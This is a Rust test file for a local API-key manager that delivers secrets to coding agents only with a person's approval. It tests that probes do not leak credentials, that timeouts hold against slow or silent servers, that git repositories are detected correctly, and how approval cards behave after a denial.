fn a_query_probe_transport_error_contains_no_credential_or_url() {
    let raw = "AQ key/?#&%ключ";
    let encoded = validate::percent_encode(raw);
    let normalized_encoded = encoded.replace("%2F", "%2f").replace("%3F", "%3f");
    let v = SecretString::from(raw.to_string());
    let (url, _rx, _h) = loopback("attacker-controlled malformed response\r\n\r\n");
    match validate::liveness(&check_for(&url, "query:key"), &v, std::time::Duration::from_secs(1)) {
        validate::Liveness::Unknown(message) => {
            assert!(message.starts_with("provider check failed: "), "failure category must remain actionable: {message}");
            assert!(!message.contains("attacker-controlled"), "transport details must not be reflected: {message}");
            assert!(!message.contains("://"), "credential-bearing URL must not be reflected: {message}");
            assert!(!message.contains(raw), "raw credential leaked: {message}");
            assert!(!message.contains(&encoded), "percent-encoded credential leaked: {message}");
            assert!(!message.contains(&normalized_encoded), "normalized percent-encoded credential leaked: {message}");
        }
        other => panic!("expected transport failure, got {other:?}"),
    }
}

/// The probe's timeout is a promise to the caller, whatever phase the request is in. This
/// provider completes the TCP handshake, opens a TLS record and trickles it a byte at a time:
/// rustls keeps reading, and each byte restarts the socket timeouts ureq set. The caller must
/// still have its answer at the deadline.
#[test]
fn a_provider_that_trickles_its_tls_handshake_costs_the_probe_timeout() {
    use std::io::{Read, Write};
    let l = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let url = format!("https://127.0.0.1:{}/probe", l.local_addr().unwrap().port());
    let (trickling_tx, trickling_rx) = std::sync::mpsc::channel::<()>();
    let (stop_tx, stop_rx) = std::sync::mpsc::channel::<()>();
    std::thread::spawn(move || {
        let Ok((mut s, _)) = l.accept() else { return };
        let mut hello = [0u8; 4096];
        let _ = s.read(&mut hello);
        // A handshake record announcing 16 KiB, then one byte every 100 ms for up to 30 s.
        if s.write_all(&[0x16, 0x03, 0x03, 0x40, 0x00]).is_err() {
            return;
        }
        let _ = trickling_tx.send(());
        for _ in 0..300 {
            if stop_rx.try_recv().is_ok() || s.write_all(&[0]).is_err() {
                return;
            }
            std::thread::sleep(std::time::Duration::from_millis(100));
        }
    });
    let v = SecretString::from("sk-probe-value-000000000000".to_string());
    let started = std::time::Instant::now();
    let verdict = validate::liveness(&check_for(&url, "bearer"), &v, std::time::Duration::from_secs(1));
    let took = started.elapsed();
    let _ = stop_tx.send(());
    assert!(trickling_rx.try_recv().is_ok(), "the provider reached the trickle, so the TLS phase is what was cut");
    assert_eq!(verdict, validate::Liveness::Unknown("provider check timed out".into()));
    assert!(took < std::time::Duration::from_secs(3), "{took:?}");
}

/// ...and one that takes the request and never answers costs the same. The listener reports
/// the request line it received, so an unrelated early failure cannot pass for this.
#[test]
fn a_silent_provider_costs_the_probe_timeout_and_no_more() {
    use std::io::Read;
    let l = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let url = format!("http://127.0.0.1:{}/probe", l.local_addr().unwrap().port());
    let (got_tx, got_rx) = std::sync::mpsc::channel::<String>();
    let (stop_tx, stop_rx) = std::sync::mpsc::channel::<()>();
    std::thread::spawn(move || {
        let Ok((mut s, _)) = l.accept() else { return };
        let (mut buf, mut chunk) = (Vec::new(), [0u8; 1024]);
        while !buf.windows(2).any(|w| w == b"\r\n") {
            match s.read(&mut chunk) {
                Ok(0) | Err(_) => break,
                Ok(n) => buf.extend_from_slice(&chunk[..n]),
            }
        }
        let _ = got_tx.send(String::from_utf8_lossy(&buf).to_string());
        let _ = stop_rx.recv_timeout(std::time::Duration::from_secs(30));
    });
    let v = SecretString::from("sk-probe-value-000000000000".to_string());
    let started = std::time::Instant::now();
    let verdict = validate::liveness(&check_for(&url, "bearer"), &v, std::time::Duration::from_secs(1));
    let took = started.elapsed();
    let _ = stop_tx.send(());
    assert!(matches!(verdict, validate::Liveness::Unknown(_)), "{verdict:?}");
    assert!(took < std::time::Duration::from_secs(3), "{took:?}");
    let req = got_rx.recv_timeout(std::time::Duration::from_secs(1)).expect("the request reached the provider");
    assert!(req.starts_with("GET /probe "), "{req}");
}

/// The worker limiter admits up to its size, refuses the next at once, and gets each slot
/// back when a worker ends, however it ends. A local limiter, so saturating it cannot starve
/// the probes other tests run in parallel.
#[test]
fn the_probe_limiter_admits_refuses_and_gives_slots_back() {
    use std::time::{Duration, Instant};
    let lim: &'static validate::Limiter = Box::leak(Box::new(validate::Limiter::new(2)));
    let drained = |lim: &validate::Limiter| {
        let until = Instant::now() + Duration::from_secs(5);
        while lim.running() > 0 && Instant::now() < until {
            std::thread::sleep(Duration::from_millis(10));
        }
        lim.running()
    };
    // Two workers that keep their slots after their callers stop waiting.
    let mut holds = Vec::new();
    for _ in 0..2 {
        let (hold_tx, hold_rx) = std::sync::mpsc::channel::<()>();
        holds.push(hold_tx);
        let r = validate::within(lim, Duration::from_millis(50), move || {
            let _ = hold_rx.recv();
        });
        assert!(matches!(r, Err(validate::Waited::TimedOut)), "{r:?}");
    }
    assert_eq!(lim.running(), 2);
    let started = Instant::now();
    let r = validate::within(lim, Duration::from_secs(5), || 1);
    assert!(matches!(r, Err(validate::Waited::Busy)), "{r:?}");
    assert!(started.elapsed() < Duration::from_millis(500), "a full limiter refuses at once");
    drop(holds); // the holders' recv() fails, they end, and their slots come back
    assert_eq!(drained(lim), 0);
    assert_eq!(validate::within(lim, Duration::from_secs(5), || 7).ok(), Some(7));
    // A worker that dies without answering is not a timeout, and still gives its slot back.
    let started = Instant::now();
    let r = validate::within(lim, Duration::from_secs(5), || -> u8 { panic!("worker died on purpose") });
    assert!(matches!(r, Err(validate::Waited::Died)), "{r:?}");
    assert!(started.elapsed() < Duration::from_secs(2));
    assert_eq!(drained(lim), 0);
}

/// An empty `.git` is not a repository. Codex's sandbox puts one into each writable root (the
/// project directory, and /tmp) for as long as a session runs, and git itself answers "not a
/// git repository" there. Treating it as a checkout made the tracked-file check fail closed,
/// so no key could be delivered into a project that was not a repo.
#[test]
fn an_empty_git_directory_is_not_a_repository() {
    let dir = tmp("placeholder-git").canonicalize().unwrap();
    std::fs::create_dir_all(dir.join(".git")).unwrap();
    let sub = dir.join("app");
    std::fs::create_dir_all(&sub).unwrap();
    assert_eq!(envfile::git_root(&sub), None, "an empty .git is not a repo");
    assert_eq!(envfile::owned_git_root(&sub).unwrap(), None);
    assert!(!envfile::git_trackedness(&sub, &sub.join(".env.local")).unwrap());
    // ...so a key can be delivered there,
    let written = envfile::write(&sub, ".env.local", "K", &SecretString::from("vvvvvvvv".to_string())).unwrap();
    assert!(written.starts_with(&sub), "{}", written.display());
    // and a real repository is still one: HEAD makes the difference.
    std::fs::write(dir.join(".git/HEAD"), "ref: refs/heads/main\n").unwrap();
    assert_eq!(envfile::git_root(&sub), Some(dir.clone()));
    assert_eq!(envfile::owned_git_root(&sub).unwrap(), Some(dir.clone()));
}

/// Only an empty directory is set aside. A real repository must never read as absent, so every
/// other shape of `.git` still counts: a worktree or submodule gitfile of any size or bytes, a
/// repository on an unborn branch whose HEAD is a symlink to a ref that does not exist yet, and
/// a `.git` that cannot be read.
#[test]
fn every_other_git_entry_still_counts_as_a_repository() {
    let gitfile = tmp("gitfile").canonicalize().unwrap();
    std::fs::write(gitfile.join(".git"), "gitdir: /elsewhere/.git/worktrees/x\n").unwrap();
    assert_eq!(envfile::git_root(&gitfile), Some(gitfile.clone()));
    // git trims trailing newlines, so a gitfile padded past any size limit is still valid
    let padded = tmp("gitfile-padded").canonicalize().unwrap();
    std::fs::write(padded.join(".git"), format!("gitdir: /elsewhere/.git{}", "\n".repeat(8192))).unwrap();
    assert_eq!(envfile::git_root(&padded), Some(padded.clone()));
    let empty_file = tmp("gitfile-empty").canonicalize().unwrap();
    std::fs::write(empty_file.join(".git"), "").unwrap();
    assert_eq!(envfile::git_root(&empty_file), Some(empty_file.clone()), "only an empty directory is set aside");
    #[cfg(unix)]
    {
        // an unborn branch: HEAD is a symlink to a ref that does not exist yet
        let unborn = tmp("unborn-symlink-head").canonicalize().unwrap();
        std::fs::create_dir_all(unborn.join(".git")).unwrap();
        std::os::unix::fs::symlink("refs/heads/main", unborn.join(".git/HEAD")).unwrap();
        assert_eq!(envfile::git_root(&unborn), Some(unborn.clone()));
        // a gitfile whose path is not UTF-8
        let bytes = tmp("gitfile-non-utf8").canonicalize().unwrap();
        std::fs::write(bytes.join(".git"), b"gitdir: /elsewhere/\xff\xfe/.git\n").unwrap();
        assert_eq!(envfile::git_root(&bytes), Some(bytes.clone()));
        // a .git directory that cannot be read is not provably empty (root reads it anyway)
        use std::os::unix::fs::PermissionsExt;
        let locked = tmp("unreadable-git").canonicalize().unwrap();
        std::fs::create_dir_all(locked.join(".git")).unwrap();
        std::fs::set_permissions(locked.join(".git"), std::fs::Permissions::from_mode(0o000)).unwrap();
        let unreadable = std::fs::read_dir(locked.join(".git")).is_err();
        let seen = envfile::git_root(&locked);
        std::fs::set_permissions(locked.join(".git"), std::fs::Permissions::from_mode(0o700)).unwrap();
        if unreadable {
            assert_eq!(seen, Some(locked.clone()), "unreadable is not provably empty");
        }
    }
}

/// `agent_mode` is written only when it is not the default, so a config this version saved
/// still loads in 0.2 (`deny_unknown_fields`) for everyone who kept auto mode.
#[test]
fn agent_mode_round_trips_and_the_default_is_not_written() {
    use crate::config::AgentMode;
    let auto = toml::to_string(&Config::default()).unwrap();
    assert!(!auto.contains("agent_mode"), "{auto}");
    let explicit = toml::to_string(&Config { agent_mode: AgentMode::Explicit, ..Default::default() }).unwrap();
    assert!(explicit.contains("agent_mode = \"explicit\""), "{explicit}");
    let back: Config = toml::from_str(&explicit).unwrap();
    assert_eq!(back.agent_mode, AgentMode::Explicit);
    let back: Config = toml::from_str(&auto).unwrap();
    assert_eq!(back.agent_mode, AgentMode::Auto);
    assert!(toml::from_str::<Config>("agent_mode = \"sometimes\"\n").is_err());
}

/// An action card names exactly what it does, and anything else under the `action:` prefix
/// (a newer verb, targets that do not parse) is no action at all: nothing runs on a guess.
#[test]
fn action_cards_round_trip_and_refuse_what_they_do_not_know() {
    use crate::actions::Action;
    let _env = env_lock();
    let home = tmp("actions-home");
    std::env::set_var("TOKENSTASH_HOME", &home);
    std::env::set_var("TOKENSTASH_STASH", "insecure-file");
    let proj = tmp("actions-proj").canonicalize().unwrap();
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    for a in [Action::Forget { name: "OPENAI_API_KEY".into(), identity: "work".into() }, Action::Bind { name: "STRIPE_SECRET_KEY".into(), identity: "work".into() }, Action::Mode("explicit".into()), Action::Mcp(false), Action::Undo] {
        let t = crate::actions::request(&ctx, &proj, "agent", &a, Some("asked by the user".into())).unwrap();
        assert_eq!(Action::of(&t), Some(a.clone()), "{t:?}");
        // The same request again is the same card.
        assert_eq!(crate::actions::request(&ctx, &proj, "agent", &a, None).unwrap().id, t.id);
    }
    let mut t = crate::actions::request(&ctx, &proj, "agent", &Action::Undo, None).unwrap();
    for (expects, names) in [("action:reboot", vec![]), ("action:mode", vec!["sometimes".to_string()]), ("action:forget", vec![]), ("action:forget", vec!["A@x".into(), "B@y".into()]), ("confirm", vec![])] {
        t.expects = expects.into();
        t.names = names;
        assert_eq!(Action::of(&t), None, "{expects}");
    }
}

/// Greptile on #68: an agent asking again after a no (`need --force` from an agent) must get
/// a card, not the key, even where a broad grant made before the no would deliver it. A
/// person's own `--force` still delivers.
#[test]
fn asking_again_after_a_no_files_a_card_even_under_a_broad_grant() {
    let _env = env_lock();
    let home = tmp("ask-again-home");
    std::env::set_var("TOKENSTASH_HOME", &home);
    std::env::set_var("TOKENSTASH_STASH", "insecure-file");
    let proj = tmp("ask-again-proj").canonicalize().unwrap();
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    stash.set(&stash::stash_key("GROQ_API_KEY", "default"), &SecretString::from("gsk_askagain_0123456789".to_string())).unwrap();
    db.upsert_secret(&db::SecretMeta { name: "GROQ_API_KEY".into(), identity: "default".into(), provider: Some("Groq".into()), sensitive: false, source_url: None, created: now(), last_used: None, stale: false, last_verified: None, stale_reason: None, stale_source: None, next_probe: None, verify_off: false }).unwrap();
    let ws = db.workspace_for(&proj).unwrap();
    db.grant(&ws.id, "*", "default", db::GRANT_BROAD, db::GRANT_PAIRING).unwrap();
    // The person declined a card for this key here.
    let t = tasks::create_secret_task(&ctx, &proj, "agent", "GROQ_API_KEY", "default", &tasks::SecretRequest::default()).unwrap();
    tasks::deny(&ctx, &t, None).unwrap();
    let name = ["GROQ_API_KEY".to_string()];
    let plain = need::need(&ctx, &proj, "agent", &name, &need::NeedOpts::default()).unwrap();
    assert!(matches!(plain[0], need::Outcome::Denied { .. }), "{plain:?}");
    let again = need::need(&ctx, &proj, "agent", &name, &need::NeedOpts { force: true, ask_again: true, ..Default::default() }).unwrap();
    assert!(matches!(again[0], need::Outcome::Pending { .. }), "a card, not the key: {again:?}");
    assert!(!crate::envfile::has(&proj, ".env.local", "GROQ_API_KEY"), "nothing written");
    let person = need::need(&ctx, &proj, "human", &name, &need::NeedOpts { force: true, ..Default::default() }).unwrap();
    assert!(matches!(person[0], need::Outcome::Injected { .. }), "{person:?}");
}

/// Greptile on #68: a card past its deadline is not handed out again.
#[test]
fn an_expired_action_card_is_not_reused() {
    use crate::actions::Action;
    let _env = env_lock();
    let home = tmp("expired-action-home");
    std::env::set_var("TOKENSTASH_HOME", &home);
    std::env::set_var("TOKENSTASH_STASH", "insecure-file");
    let proj = tmp("expired-action-proj").canonicalize().unwrap();
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let first = crate::actions::request(&ctx, &proj, "agent", &Action::Undo, None).unwrap();
    db.conn.execute("UPDATE tasks SET deadline='2000-01-01T00:00:00Z' WHERE id=?1", rusqlite::params![first.id]).unwrap();
    let second = crate::actions::request(&ctx, &proj, "agent", &Action::Undo, None).unwrap();
    assert_ne!(first.id, second.id);
    assert_eq!(db.get_task(&first.id).unwrap().unwrap().status, db::TaskStatus::Expired);
}

/// Greptile on #68: a confirm that stops half way must not leave its card looking done, a
/// worker that was taken over must not close or release the card under the one that took it,
/// and a card cannot be declined while its action is being carried out.
#[test]
fn an_action_claim_belongs_to_its_worker_and_runs_out() {
    use crate::actions::Action;
    let _env = env_lock();
    let home = tmp("claim-home");
    std::env::set_var("TOKENSTASH_HOME", &home);
    std::env::set_var("TOKENSTASH_STASH", "insecure-file");
    let proj = tmp("claim-proj").canonicalize().unwrap();
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let t = crate::actions::request(&ctx, &proj, "agent", &Action::Undo, None).unwrap();
    let first = db.claim_action(&t.id).unwrap().expect("the first confirm claims it");
    assert_eq!(db.get_task(&t.id).unwrap().unwrap().status, db::TaskStatus::Pending, "still pending while it runs");
    assert!(db.claim_action(&t.id).unwrap().is_none(), "a second confirm waits");
    let err = tasks::deny(&ctx, &t, None).unwrap_err();
    assert!(format!("{err:#}").contains("being carried out"), "{err:#}");
    // The first worker stopped: its claim runs out and another confirm takes the card over.
    db.conn.execute("UPDATE tasks SET note=?2 WHERE id=?1", rusqlite::params![t.id, format!("{}2000-01-01T00:00:00Z 0000000000000000", db::CONFIRMING)]).unwrap();
    let second = db.claim_action(&t.id).unwrap().expect("a claim that ran out is taken over");
    // The first worker comes back: it can neither give the claim back nor close the card.
    db.release_action_claim(&t.id, &first).unwrap();
    assert!(!db.finish_action(&t.id, &first, "done by the first").unwrap());
    assert_eq!(db.get_task(&t.id).unwrap().unwrap().note.as_deref(), Some(second.as_str()));
    assert!(db.finish_action(&t.id, &second, "done").unwrap());
    let done = db.get_task(&t.id).unwrap().unwrap();
    assert_eq!((done.status, done.note.as_deref()), (db::TaskStatus::Answered, Some("done")));
    // A claim given back after a failure frees the card for another try, or a decline.
    let u = crate::actions::request(&ctx, &proj, "agent", &Action::Mcp(false), None).unwrap();
    let c = db.claim_action(&u.id).unwrap().unwrap();
    db.release_action_claim(&u.id, &c).unwrap();
    assert!(tasks::deny(&ctx, &u, None).is_ok());
}

/// Greptile on #68: an exact grant from before a no does not deliver the key to an agent that
/// asks again; the person gets a card.
#[test]
fn asking_again_files_a_card_even_with_an_exact_grant() {
    let _env = env_lock();
    let home = tmp("ask-again-exact-home");
    std::env::set_var("TOKENSTASH_HOME", &home);
    std::env::set_var("TOKENSTASH_STASH", "insecure-file");
    let proj = tmp("ask-again-exact-proj").canonicalize().unwrap();
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    pair(&db, &proj, "GROQ_API_KEY");
    let t = tasks::create_secret_task(&ctx, &proj, "agent", "GROQ_API_KEY", "default", &tasks::SecretRequest::default()).unwrap();
    tasks::deny(&ctx, &t, None).unwrap();
    // Stored since, from another directory.
    stash.set(&stash::stash_key("GROQ_API_KEY", "default"), &SecretString::from("gsk_storedelsewhere_0123456789".to_string())).unwrap();
    db.upsert_secret(&db::SecretMeta { name: "GROQ_API_KEY".into(), identity: "default".into(), provider: Some("Groq".into()), sensitive: false, source_url: None, created: now(), last_used: None, stale: false, last_verified: None, stale_reason: None, stale_source: None, next_probe: None, verify_off: false }).unwrap();
    let again = need::need(&ctx, &proj, "agent", &["GROQ_API_KEY".to_string()], &need::NeedOpts { force: true, ask_again: true, ..Default::default() }).unwrap();
    assert!(matches!(again[0], need::Outcome::Pending { .. }), "{again:?}");
    assert!(!crate::envfile::has(&proj, ".env.local", "GROQ_API_KEY"));
}

/// Greptile on #68: the extra ask after a no is spent on the card it filed. One a stopped
/// process reserved and never filed a card for is taken back; one in flight is not; a request
/// that failed part way keeps the asks it already filed cards for.
#[test]
fn the_extra_ask_is_spent_on_its_card_and_recovered_when_none_was_filed() {
    let _env = env_lock();
    let home = tmp("force-reserve-home");
    std::env::set_var("TOKENSTASH_HOME", &home);
    std::env::set_var("TOKENSTASH_STASH", "insecure-file");
    let proj = tmp("force-reserve-proj").canonicalize().unwrap();
    let pid = proj.to_string_lossy().to_string();
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let since = cfg.ttl_since();
    let row = db.reserve_force(&pid, "agent", "GROQ_API_KEY", &since).unwrap().expect("the first ask is free");
    assert!(db.reserve_force(&pid, "agent", "GROQ_API_KEY", &since).unwrap().is_none(), "one in flight holds it");
    // The process stopped before filing anything: a minute on, the ask comes back.
    db.conn.execute("UPDATE audit SET ts='2000-01-01T00:00:00Z' WHERE id=?1", rusqlite::params![row]).unwrap();
    let old = cfg.ttl_since().replace(&cfg.ttl_since()[..4], "1999");
    let row = db.reserve_force(&pid, "agent", "GROQ_API_KEY", &old).unwrap().expect("a reservation left behind is taken back");
    // A card filed under a reservation that a stopped process never named still spends it...
    let filed = tasks::create_secret_task(&ctx, &proj, "agent", "RESEND_API_KEY", "default", &tasks::SecretRequest::default()).unwrap();
    let r2 = db.reserve_force(&pid, "agent", "RESEND_API_KEY", &old).unwrap().unwrap();
    db.conn.execute("UPDATE audit SET ts='2000-06-01T00:00:00Z' WHERE id=?1", rusqlite::params![r2]).unwrap();
    db.conn.execute("UPDATE tasks SET created='2000-06-01T00:00:20Z' WHERE id=?1", rusqlite::params![filed.id]).unwrap();
    assert!(db.reserve_force(&pid, "agent", "RESEND_API_KEY", &old).unwrap().is_none(), "the card filed under it proves the ask was used");
    // ...but a later card from another request, or another agent, does not.
    let r3 = db.reserve_force(&pid, "agent", "STRIPE_SECRET_KEY", &old).unwrap().unwrap();
    db.conn.execute("UPDATE audit SET ts='2000-06-01T00:00:00Z' WHERE id=?1", rusqlite::params![r3]).unwrap();
    let later = tasks::create_secret_task(&ctx, &proj, "agent", "STRIPE_SECRET_KEY", "default", &tasks::SecretRequest::default()).unwrap();
    db.conn.execute("UPDATE tasks SET created='2000-06-01T00:05:00Z' WHERE id=?1", rusqlite::params![later.id]).unwrap();
    let other = tasks::create_secret_task(&ctx, &proj, "someone-else", "STRIPE_SECRET_KEY", "work", &tasks::SecretRequest::default()).unwrap();
    db.conn.execute("UPDATE tasks SET created='2000-06-01T00:00:10Z' WHERE id=?1", rusqlite::params![other.id]).unwrap();
    assert_eq!(db.card_since_reservation(r3, &pid, "STRIPE_SECRET_KEY").unwrap(), None);
    assert!(db.reserve_force(&pid, "agent", "STRIPE_SECRET_KEY", &old).unwrap().is_some(), "an ask that never reached the user comes back");
    // Spent on the card it filed: no more asks in the window.
    let card = tasks::create_secret_task(&ctx, &proj, "agent", "GROQ_API_KEY", "default", &tasks::SecretRequest::default()).unwrap();
    assert_eq!(db.card_since_reservation(row, &pid, "GROQ_API_KEY").unwrap(), Some(card.id.clone()));
    db.bind_force(row, &card.id).unwrap();
    db.conn.execute("UPDATE audit SET ts='2000-01-01T00:00:01Z' WHERE id=?1", rusqlite::params![row]).unwrap();
    assert!(db.reserve_force(&pid, "agent", "GROQ_API_KEY", &old).unwrap().is_none(), "a spent ask stays spent however old");
}


/// Greptile on #69: a command that loaded the config earlier saves only what it changed,
/// so `init` finishing after a `remote off` does not turn remote access back on.
#[test]
fn a_config_update_keeps_what_another_command_changed() {
    use crate::config::{AgentMode, Remote};
    let _env = env_lock();
    let home = tmp("config-update");
    std::env::set_var("TOKENSTASH_HOME", &home);
    Config::update(|c| { c.remote = Remote::Tailscale; c.remote_ip = Some("100.64.0.1".into()); Ok(()) }).unwrap();
    // `init` loads here, and is still working when the person turns remote access off.
    let early = Config::load().unwrap();
    assert_eq!(early.remote, Remote::Tailscale);
    Config::update(|c| { c.remote = Remote::Off; c.remote_ip = None; Ok(()) }).unwrap();
    Config::update(|c| { c.agent_mode = AgentMode::Explicit; Ok(()) }).unwrap();
    let now = Config::load().unwrap();
    assert_eq!(now.remote, Remote::Off);
    assert_eq!(now.remote_ip, None);
    assert_eq!(now.agent_mode, AgentMode::Explicit);
    // A change that fails writes nothing.
    assert!(Config::update(|c| { c.remote = Remote::Tailscale; anyhow::bail!("no") as anyhow::Result<()> }).is_err());
    assert_eq!(Config::load().unwrap().remote, Remote::Off);
    std::env::set_var("TOKENSTASH_HOME", base_home());
}
